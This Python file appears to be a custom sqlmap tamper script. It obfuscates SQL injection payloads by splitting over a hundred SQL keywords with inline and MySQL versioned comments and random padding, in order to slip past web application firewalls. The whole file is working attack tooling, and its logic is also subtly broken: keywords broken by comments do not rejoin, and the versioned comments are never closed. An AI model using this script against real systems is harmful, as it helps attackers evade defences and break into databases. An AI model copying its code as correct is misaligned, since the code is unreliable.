#!/usr/bin/env python
"""
Ultimate random chunk splitter tamper for sqlmap.

Safely fragments SQL keywords by inserting comments inside them,
using DBMS‑specific syntax (MySQL only for true concatenation,
others fallback to random comments or skip).

Features:
- DBMS detection (MySQL, PostgreSQL, MSSQL, Oracle)
- For MySQL: split keywords into 2-4 fragments with comments between
- Multiple comment types: /**/, /*!version...*/, /*!00000...*/
- Random padding (hex, base64, alphanumeric) inside comments
- Error handling – on failure, keep original
- Randomised per‑request (different splits and comment types)
- Over 100 SQL keywords
"""

import re
import random
import string
import base64
from lib.core.enums import PRIORITY
from lib.core.common import singleTimeWarnMessage

__priority__ = PRIORITY.HIGH

# ------------------------------------------------------------------
# Comment syntax definitions
# ------------------------------------------------------------------
COMMENT_TYPES = {
    "inline": ("/**/", ""),               # normal inline comment
    "versioned": ("/*!50727", "*/"),      # MySQL versioned (version can vary)
    "zero_versioned": ("/*!00000", "*/")  # MySQL zero‑versioned
}

# ------------------------------------------------------------------
# Comprehensive keyword list (sorted by length descending for correct matches)
# ------------------------------------------------------------------
SQL_KEYWORDS = sorted([
    "SELECT", "UNION", "ALL", "DISTINCT", "FROM", "WHERE", "AND", "OR", "NOT",
    "ORDER", "BY", "GROUP", "HAVING", "LIMIT", "OFFSET", "FETCH", "NEXT",
    "INSERT", "UPDATE", "DELETE", "DROP", "CREATE", "ALTER", "EXEC", "EXECUTE",
    "DECLARE", "SET", "MERGE", "REPLACE", "TRUNCATE", "RENAME", "COMMENT",
    "GRANT", "REVOKE", "BEGIN", "COMMIT", "ROLLBACK", "SAVEPOINT", "LOCK",
    "TABLE", "VIEW", "INDEX", "SEQUENCE", "PROCEDURE", "FUNCTION", "TRIGGER",
    "CASE", "WHEN", "THEN", "ELSE", "END", "IF", "ELSEIF", "LOOP", "WHILE",
    "FOR", "CURSOR", "OPEN", "CLOSE", "FETCH", "EXIT", "CONTINUE",
    "RETURN", "GOTO", "NULL", "IS", "IN", "EXISTS", "BETWEEN", "LIKE",
    "REGEXP", "RLIKE", "SOUNDS", "MATCH", "AGAINST", "WITH", "RECURSIVE",
    "WINDOW", "PARTITION", "OVER", "RANK", "DENSE_RANK", "ROW_NUMBER",
    "LAG", "LEAD", "FIRST_VALUE", "LAST_VALUE", "NTH_VALUE", "NTILE",
    "CUME_DIST", "PERCENT_RANK", "PIVOT", "UNPIVOT", "XML", "JSON",
    "EXTRACT", "VALUE", "REF", "DEREF", "MULTISET", "COLLECT", "GROUPING",
    "ROLLUP", "CUBE", "TABLESAMPLE", "TIES", "SYSTEM_TIME", "AS", "OF",
    "LEFT", "RIGHT", "INNER", "OUTER", "JOIN", "ON", "USING", "NATURAL",
    "CROSS", "FULL", "STRAIGHT_JOIN", "SQL_NO_CACHE", "SQL_CALC_FOUND_ROWS"
], key=len, reverse=True)

# ------------------------------------------------------------------
# Utility functions
# ------------------------------------------------------------------
def _random_padding(length=None):
    """Generate random padding string (hex, base64, or alnum)."""
    length = length or random.randint(4, 16)
    choices = [
        lambda: ''.join(random.choices(string.hexdigits, k=length)),
        lambda: base64.b64encode(random.randbytes(length)).decode('ascii')[:length],
        lambda: ''.join(random.choices(string.ascii_letters + string.digits, k=length))
    ]
    return random.choice(choices)()

def _random_version():
    """Return a random MySQL version number (50727..99999)."""
    return random.randint(50727, 99999)

# ------------------------------------------------------------------
# Fragmentation function (only safe for MySQL)
# ------------------------------------------------------------------
def _fragment_mysql_keyword(original):
    """
    Split the keyword into 2-4 parts and insert comments between each.
    Returns the fragmented keyword or None if it fails.
    """
    if len(original) < 3:
        return original  # too short to split meaningfully

    # Decide number of fragments (2 to 4, not exceeding length)
    max_parts = min(4, len(original))
    num_parts = random.randint(2, max_parts)

    # Generate random split positions that divide the keyword into num_parts
    # e.g., for "SELECT" and 3 parts: split at positions 2 and 4 -> "SE", "LE", "CT"
    splits = sorted(random.sample(range(1, len(original)), num_parts - 1))
    parts = []
    prev = 0
    for split in splits:
        parts.append(original[prev:split])
        prev = split
    parts.append(original[prev:])

    # Choose a comment type for each gap (can be different per gap)
    comment_types = []
    # MySQL supports all; we can choose inline or versioned
    for _ in range(num_parts - 1):
        # Randomly pick one of the MySQL-safe comment types
        choice = random.choice(["inline", "versioned", "zero_versioned"])
        comment_types.append(choice)

    # Build the fragmented string
    result = parts[0]
    for i in range(num_parts - 1):
        ctype = comment_types[i]
        if ctype == "inline":
            open_comm, close_comm = COMMENT_TYPES["inline"]
            # For inline, we can just put /**/ with optional padding? Usually no padding needed.
            # But we can add padding inside comment: /**/ padding? Actually /**/ cannot have content.
            # So we just use /**/.
            comment = "/**/"
        elif ctype == "versioned":
            ver = _random_version()
            pad = _random_padding(6)
            comment = f"/*!{ver}%0a{pad}%0a"
        elif ctype == "zero_versioned":
            pad = _random_padding(6)
            comment = f"/*!00000%0a{pad}%0a"
        else:
            comment = "/**/"
        # Append comment and next part
        result += comment + parts[i+1]

    return result

# ------------------------------------------------------------------
# Main tamper function
# ------------------------------------------------------------------
def tamper(payload, **kwargs):
    if not payload:
        return payload

    # Detect DBMS
    dbms = kwargs.get('dbms', '').lower()
    # If not MySQL, we fallback to a safer approach: just insert random comments
    # anywhere (like randomcomments.py) but we keep the script name.
    if dbms not in ('mysql', 'mariadb'):
        # For other DBMS, we cannot fragment keywords because comments inside
        # keywords break them into separate tokens. So we skip fragmentation.
        # Instead, we can optionally apply a different technique (e.g., random comments)
        # but we'll just return the payload unchanged to avoid breaking SQL.
        # We could also call another tamper like randomcomments, but we are this script.
        # We'll just warn and keep original.
        singleTimeWarnMessage("Random chunk splitter is optimized for MySQL; skipping for non-MySQL DBMS.")
        return payload

    # Choose a random subset of keywords to fragment (70-100%) to avoid patterns
    obfuscate_prob = random.uniform(0.7, 1.0)
    keywords_to_use = [kw for kw in SQL_KEYWORDS if random.random() < obfuscate_prob]

    ret_val = payload
    for kw in keywords_to_use:
        # Skip very short keywords
        if len(kw) < 3:
            continue

        # Build pattern to match whole keyword (case-insensitive)
        pattern = re.compile(r'\b' + re.escape(kw) + r'\b', re.IGNORECASE)

        def _replace(match):
            original = match.group(0)
            try:
                fragmented = _fragment_mysql_keyword(original)
                if fragmented is None:
                    return original
                # Occasionally add extra spaces or parentheses around the fragmented keyword
                if random.random() > 0.85:
                    fragmented = f"({fragmented})"
                if random.random() > 0.9:
                    fragmented = f" {fragmented} "
                return fragmented
            except Exception:
                # On any error, keep original
                return original

        ret_val = pattern.sub(_replace, ret_val)

    return ret_val

def dependencies():
    pass
